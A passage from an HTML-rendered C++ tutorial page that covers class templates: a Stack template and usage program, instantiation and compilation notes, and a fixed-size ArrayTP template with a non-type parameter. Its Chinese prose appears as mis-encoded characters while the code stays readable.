class="keyword">return</span> top == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::isfull() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> top == MAX;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::push(<span class="keyword">const</span> T &amp; item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (top &lt; MAX) &#123;</span><br><span class="line">        items[top++] = item; <span class="comment">// ä½¿ç”¨ç±»å‹ T çš„èµ‹å€¼æ“ä½œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">bool</span> Stack&lt;T&gt;::pop(T &amp; item) &#123;</span><br><span class="line">    <span class="keyword">if</span> (top &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        item = items[--top]; <span class="comment">// ä½¿ç”¨ç±»å‹ T çš„èµ‹å€¼æ“ä½œ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STACKTP_H_</span></span></span><br></pre></td></tr></table></figure><h3 id="14-4-2-ä½¿ç”¨æ¨¡æ¿ç±»"><a href="#14-4-2-ä½¿ç”¨æ¨¡æ¿ç±»" class="headerlink" title="14.4.2 ä½¿ç”¨æ¨¡æ¿ç±»"></a>14.4.2 ä½¿ç”¨æ¨¡æ¿ç±»</h3><p>è¦ä½¿ç”¨ç±»æ¨¡æ¿ï¼Œä½ éœ€è¦<strong>å®ä¾‹åŒ– (Instantiate)</strong> å®ƒã€‚å®ä¾‹åŒ–æ˜¯æŒ‡ä¸ºæ¨¡æ¿å‚æ•°æä¾›å…·ä½“çš„ç±»å‹ï¼ˆæˆ–å€¼ï¼‰ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªå…·ä½“çš„ç±»ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ClassName&lt;ConcreteType1, ConcreteType2, ...&gt; objectName(constructor_arguments);</span><br></pre></td></tr></table></figure><ul><li>  åœ¨ç±»æ¨¡æ¿åç§°åé¢è·Ÿä¸Šå°–æ‹¬å· <code>&lt;&gt;</code>ï¼Œå¹¶åœ¨å…¶ä¸­æŒ‡å®šç”¨äºæ›¿æ¢æ¨¡æ¿å‚æ•°çš„å…·ä½“ç±»å‹ã€‚</li><li>  ç„¶ååƒåˆ›å»ºæ™®é€šç±»çš„å¯¹è±¡ä¸€æ ·å£°æ˜å¯¹è±¡å¹¶è°ƒç”¨æ„é€ å‡½æ•°ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨ <code>Stack</code> æ¨¡æ¿</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stack_user.cpp -- ä½¿ç”¨ Stack æ¨¡æ¿ç±»</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt; // for isalpha, etc. (å‡è®¾ç”¨äºå¤„ç†è¾“å…¥)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stacktp.h&quot;</span> <span class="comment">// åŒ…å«æ¨¡æ¿å®šä¹‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªå¤„ç† int çš„æ ˆ</span></span><br><span class="line">    Stack&lt;<span class="keyword">int</span>&gt; intStack; <span class="comment">// intStack æ˜¯ä¸€ä¸ª Stack&lt;int&gt; ç±»å‹çš„å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pushing integers onto intStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (!intStack.isfull() &amp;&amp; i &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        intStack.push(i++);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i<span class="number">-1</span> &lt;&lt; <span class="string">&quot; pushed. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tempInt;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Popping integers from intStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (intStack.pop(tempInt)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; tempInt &lt;&lt; <span class="string">&quot; popped. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªå¤„ç† string çš„æ ˆ</span></span><br><span class="line">    Stack&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; stringStack; <span class="comment">// stringStack æ˜¯ä¸€ä¸ª Stack&lt;std::string&gt; å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> items[] = &#123;<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>, <span class="string">&quot;cherry&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Pushing strings onto stringStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; s : items) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stringStack.push(s)) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;\&quot; pushed. &quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Stack full, cannot push \&quot;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;\&quot;.\n&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> tempString;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Popping strings from stringStack:\n&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (stringStack.pop(tempString)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; tempString &lt;&lt; <span class="string">&quot;\&quot; popped. &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¼–è¯‘å’Œè¿è¡Œ:</strong></p><p>ç”±äºæ¨¡æ¿çš„å®ç°é€šå¸¸æ”¾åœ¨å¤´æ–‡ä»¶ä¸­ï¼Œä½ åªéœ€è¦ç¼–è¯‘ä½¿ç”¨æ¨¡æ¿çš„æºæ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ stack_user.cpp -o stack_user</span><br><span class="line">./stack_user</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Pushing integers onto intStack:</span><br><span class="line">0 pushed. 1 pushed. 2 pushed. 3 pushed. 4 pushed.</span><br><span class="line">Popping integers from intStack:</span><br><span class="line">4 popped. 3 popped. 2 popped. 1 popped. 0 popped.</span><br><span class="line">Pushing strings onto stringStack:</span><br><span class="line">&quot;apple&quot; pushed. &quot;banana&quot; pushed. &quot;cherry&quot; pushed.</span><br><span class="line">Popping strings from stringStack:</span><br><span class="line">&quot;cherry&quot; popped. &quot;banana&quot; popped. &quot;apple&quot; popped.</span><br></pre></td></tr></table></figure><h3 id="14-4-3-æ·±å…¥æ¢è®¨æ¨¡æ¿ç±»"><a href="#14-4-3-æ·±å…¥æ¢è®¨æ¨¡æ¿ç±»" class="headerlink" title="14.4.3 æ·±å…¥æ¢è®¨æ¨¡æ¿ç±»"></a>14.4.3 æ·±å…¥æ¢è®¨æ¨¡æ¿ç±»</h3><ul><li><p>  <strong>æ¨¡æ¿ç¼–è¯‘æ¨¡å‹:</strong> ç±»æ¨¡æ¿æœ¬èº«å¹¶ä¸ä¼šè¢«ç¼–è¯‘æˆä»£ç ã€‚åªæœ‰å½“ä½ ç”¨å…·ä½“ç±»å‹<strong>å®ä¾‹åŒ–</strong>æ¨¡æ¿æ—¶ï¼Œç¼–è¯‘å™¨æ‰ä¼šæ ¹æ®æä¾›çš„ç±»å‹ç”Ÿæˆå¯¹åº”çš„å…·ä½“ç±»ï¼ˆä¾‹å¦‚ <code>Stack&lt;int&gt;</code> ç±»å’Œ <code>Stack&lt;string&gt;</code> ç±»ï¼‰çš„ä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**æ¨¡æ¿å®ä¾‹åŒ– (Template Instantiation)**ã€‚</p></li><li><p>  <strong>å®ç°æ”¾åœ¨å¤´æ–‡ä»¶:</strong> ç”±äºç¼–è¯‘å™¨åœ¨å®ä¾‹åŒ–æ¨¡æ¿æ—¶éœ€è¦çœ‹åˆ°æ¨¡æ¿çš„å®Œæ•´å®šä¹‰ï¼ˆåŒ…æ‹¬æˆå‘˜å‡½æ•°çš„å®ç°ï¼‰ï¼Œæ‰€ä»¥ç±»æ¨¡æ¿çš„æˆå‘˜å‡½æ•°å®ç°<strong>é€šå¸¸ä¹Ÿæ”¾åœ¨å¤´æ–‡ä»¶ä¸­</strong> (<code>.h</code> æˆ– <code>.hpp</code>)ï¼Œè€Œä¸æ˜¯å•ç‹¬çš„ <code>.cpp</code> æ–‡ä»¶ä¸­ã€‚å¦‚æœæ”¾åœ¨ <code>.cpp</code> æ–‡ä»¶ä¸­ï¼Œé“¾æ¥å™¨åœ¨é“¾æ¥å…¶ä»–ä½¿ç”¨è¯¥æ¨¡æ¿çš„ <code>.cpp</code> æ–‡ä»¶æ—¶ï¼Œå¯èƒ½æ‰¾ä¸åˆ°æ‰€éœ€å®ä¾‹åŒ–çš„ä»£ç ã€‚</p></li><li><p>  <strong>éšå¼å®ä¾‹åŒ– (Implicit Instantiation):</strong> å½“ä½ å£°æ˜ä¸€ä¸ªç‰¹å®šç±»å‹çš„æ¨¡æ¿ç±»å¯¹è±¡æ—¶ï¼ˆå¦‚ <code>Stack&lt;int&gt; s;</code>ï¼‰ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è¿›è¡Œéšå¼å®ä¾‹åŒ–ã€‚</p></li><li><p><strong>æ˜¾å¼å®ä¾‹åŒ– (Explicit Instantiation):</strong> ä½ å¯ä»¥æ˜¾å¼åœ°æŒ‡ç¤ºç¼–è¯‘å™¨åˆ›å»ºä¸€ä¸ªç‰¹å®šç±»å‹çš„å®ä¾‹ï¼Œå³ä½¿ä»£ç ä¸­æ²¡æœ‰ç›´æ¥ä½¿ç”¨è¯¥ç±»å‹çš„å¯¹è±¡ã€‚è¿™åœ¨æŸäº›åº“è®¾è®¡æˆ–æ„å»ºè¿‡ç¨‹ä¸­å¯èƒ½æœ‰ç”¨ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> <span class="class"><span class="keyword">class</span> <span class="title">Stack</span>&lt;</span><span class="keyword">double</span>&gt;; <span class="comment">// åœ¨æŸä¸ª .cpp æ–‡ä»¶ä¸­æ˜¾å¼å®ä¾‹åŒ– Stack&lt;double&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>  <strong>ç±»å‹è¦æ±‚:</strong> æ¨¡æ¿ä»£ç å¯¹ç”¨ä½œæ¨¡æ¿å‚æ•°çš„ç±»å‹é€šå¸¸æœ‰ä¸€äº›éšå¼è¦æ±‚ã€‚ä¾‹å¦‚ï¼Œ<code>Stack</code> æ¨¡æ¿è¦æ±‚ç±»å‹ <code>T</code> å…·æœ‰å¯ç”¨çš„èµ‹å€¼è¿ç®—ç¬¦ (<code>operator=</code>)ï¼Œå› ä¸º <code>push</code> å’Œ <code>pop</code> æ–¹æ³•ä¸­ä½¿ç”¨äº†èµ‹å€¼ã€‚å¦‚æœå°è¯•ç”¨ä¸æ»¡è¶³è¿™äº›è¦æ±‚çš„ç±»å‹ï¼ˆå¦‚æ²¡æœ‰èµ‹å€¼è¿ç®—ç¬¦çš„ç±»ï¼‰å®ä¾‹åŒ–æ¨¡æ¿ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ã€‚</p></li></ul><h3 id="14-4-4-æ•°ç»„æ¨¡æ¿ç¤ºä¾‹å’Œéç±»å‹å‚æ•°"><a href="#14-4-4-æ•°ç»„æ¨¡æ¿ç¤ºä¾‹å’Œéç±»å‹å‚æ•°" class="headerlink" title="14.4.4 æ•°ç»„æ¨¡æ¿ç¤ºä¾‹å’Œéç±»å‹å‚æ•°"></a>14.4.4 æ•°ç»„æ¨¡æ¿ç¤ºä¾‹å’Œéç±»å‹å‚æ•°</h3><p>ç±»æ¨¡æ¿ä¸ä»…å¯ä»¥æœ‰<strong>ç±»å‹å‚æ•°</strong> (<code>typename T</code> æˆ– <code>class T</code>)ï¼Œè¿˜å¯ä»¥æœ‰**éç±»å‹å‚æ•° (Non-type Parameters)**ã€‚éç±»å‹å‚æ•°æ˜¯å…·æœ‰å›ºå®šç±»å‹çš„å€¼ï¼Œé€šå¸¸æ˜¯æ•´å‹ï¼ˆ<code>int</code>, <code>size_t</code> ç­‰ï¼‰ã€æŒ‡é’ˆã€å¼•ç”¨æˆ–æšä¸¾ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> N&gt; <span class="comment">// T æ˜¯ç±»å‹å‚æ•°ï¼ŒN æ˜¯éç±»å‹å‚æ•° (int ç±»å‹)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayTP</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T ar[N]; <span class="comment">// æ•°ç»„å¤§å°ç”±æ¨¡æ¿å‚æ•° N å†³å®š</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    T &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  éç±»å‹å‚æ•° <code>N</code> æˆä¸ºæ¨¡æ¿å®šä¹‰çš„ä¸€éƒ¨åˆ†ã€‚</li><li>  åœ¨å®ä¾‹åŒ–æ—¶ï¼Œå¿…é¡»ä¸ºéç±»å‹å‚æ•°æä¾›ä¸€ä¸ª<strong>å¸¸é‡è¡¨è¾¾å¼</strong>ã€‚</li></ul><p><strong>ç¤ºä¾‹ï¼šå›ºå®šå¤§å°çš„æ•°ç»„æ¨¡æ¿ <code>ArrayTP</code></strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// arraytp.h -- æ¨¡æ¿ç±» ArrayTP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ARRAYTP_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARRAYTP_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for exit()</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt; <span class="comment">// n æ˜¯éç±»å‹å‚æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayTP</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    T ar[n]; <span class="comment">// æ•°ç»„å¤§å°ä¸º n</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ArrayTP() &#123;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">ArrayTP</span><span class="params">(<span class="keyword">const</span> T &amp; v)</span></span>;</span><br><span class="line">    <span class="keyword">virtual</span> T &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> i);</span><br><span class="line">    <span class="keyword">virtual</span> T <span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt;</span><br><span class="line">ArrayTP&lt;T, n&gt;::ArrayTP(<span class="keyword">const</span> T &amp; v) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        ar[i] = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt;</span><br><span class="line">T &amp; ArrayTP&lt;T, n&gt;::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error in array limits: &quot;</span> &lt;&lt; i</span><br><span class="line">                  &lt;&lt; <span class="string">&quot; is out of range\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ar[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">int</span> n&gt;</span><br><span class="line">T ArrayTP&lt;T, n&gt;::<span class="keyword">operator</span>[](<span class="keyword">int</span> i) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= n) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error in array limits: &quot;</span> &lt;&lt; i</span><br><span class="line">                  &lt;&lt; <span class="string">&quot; is out of range\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ar[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// ARRAYTP_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ ArrayTP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;arraytp.h&quot;</span> <span class="comment">// åŒ…å«æ¨¡æ¿å®šä¹‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªåŒ…å« 10 ä¸ª int çš„æ•°ç»„</span></span><br><span class="line">    ArrayTP&lt;<span class="keyword">int</span>, <span class="number">10</span>&gt; sums;</span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªåŒ…å« 10 ä¸ª double çš„æ•°ç»„</span></span><br><span class="line">    ArrayTP&lt;<span class="keyword">double</span>, <span class="number">10</span>&gt; aves;</span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ–ä¸€ä¸ªåŒ…å« 5 ä¸ªæŒ‡å‘ double çš„æŒ‡é’ˆçš„æ•°ç»„</span></span><br><span class="line">    ArrayTP&lt; ArrayTP&lt;<span class="keyword">int</span>, <span class="number">5</span>&gt;, <span class="number">10</span> &gt; twodee; <span class="comment">// æ¨¡æ¿åµŒå¥—ï¼š10x5 çš„ int æ•°ç»„</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        sums[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">5</span>; j++) &#123;</span><br><span class="line">            twodee[i][j] = (i + <span class="number">1</span>) * (j + <span class="number">1</span>);</span><br><span class="line">            sums[i] += twodee[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        aves[i] = (<span class="keyword">double</span>) sums[i] / <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.width(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>.width(<span class="number">3</span>);</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sums[i] &lt;&lt; <span class="string">&quot; = average &quot;</span> &lt;&lt; aves[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ArrayTP&lt;double, 0&gt; zero_size; // é”™è¯¯æˆ–æ— æ„ä¹‰ï¼Œå–å†³äºç¼–è¯‘å™¨å’Œå®ç°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>ArrayTP&lt;int, 10&gt;</code> å’Œ <code>ArrayTP&lt;double, 10&gt;</code> æ˜¯<strong>ä¸åŒ</strong>çš„ç±»å‹ã€‚</li><li>  <code>ArrayTP&lt;int, 10&gt;</code> å’Œ <code>ArrayTP&lt;int, 12&gt;</code> ä¹Ÿæ˜¯<strong>ä¸åŒ</strong>çš„ç±»å‹ã€‚</li><li>  éç±»å‹å‚æ•°å…è®¸æˆ‘ä»¬åœ¨ç¼–è¯‘æ—¶ç¡®å®šæ•°ç»„å¤§å°ç­‰å±æ€§ï¼Œè¿™æ¯”åŠ¨æ€åˆ†é…æ›´é«˜æ•ˆï¼Œå¹¶ä¸”å¯ä»¥è¿›è¡Œæ›´ä¸¥æ ¼çš„ç±»å‹æ£€æŸ¥ã€‚<code>std::array</code> å°±æ˜¯ä½¿ç”¨éç±»å‹å‚æ•°æ¥æŒ‡å®šå¤§å°çš„ã€‚</li></ul><h3 id="14-4-5-æ¨¡æ¿å¤šåŠŸèƒ½æ€§"><a href="#14-4-5-æ¨¡æ¿å¤šåŠŸèƒ½æ€§" class="headerlink" title="14.4.5 æ¨¡æ¿å¤šåŠŸèƒ½æ€§"></a>14.4.5 æ¨¡æ¿å¤šåŠŸèƒ½æ€§</h3><p>ç±»æ¨¡æ¿å¯ä»¥ä¸ C++ çš„å…¶ä»–ç‰¹æ€§ç»“åˆä½¿ç”¨ï¼Œæä¾›å¼ºå¤§çš„åŠŸèƒ½ï¼š</p><ul><li>  <strong>é€’å½’ä½¿ç”¨:</strong> æ¨¡æ¿å¯ä»¥é€’å½’åœ°ä½¿ç”¨è‡ªèº«ï¼Œå¦‚ <code>ArrayTP&lt; ArrayTP&lt;int, 5&gt;, 10 &gt;</code> åˆ›å»ºäºŒç»´æ•°ç»„ã€‚</li><li>  <strong>æŒ‡é’ˆç±»å‹å‚æ•°:</strong> å¯ä»¥ç”¨æŒ‡é’ˆç±»å‹å®ä¾‹åŒ–æ¨¡æ¿ï¼Œä¾‹å¦‚ <code>Stack&lt;int*&gt;</code> åˆ›å»ºä¸€ä¸ªå­˜å‚¨ <code>int</code> æŒ‡é’ˆçš„æ ˆã€‚</li><li>  <strong>åŒ…å«æ¨¡æ¿æˆå‘˜:</strong> 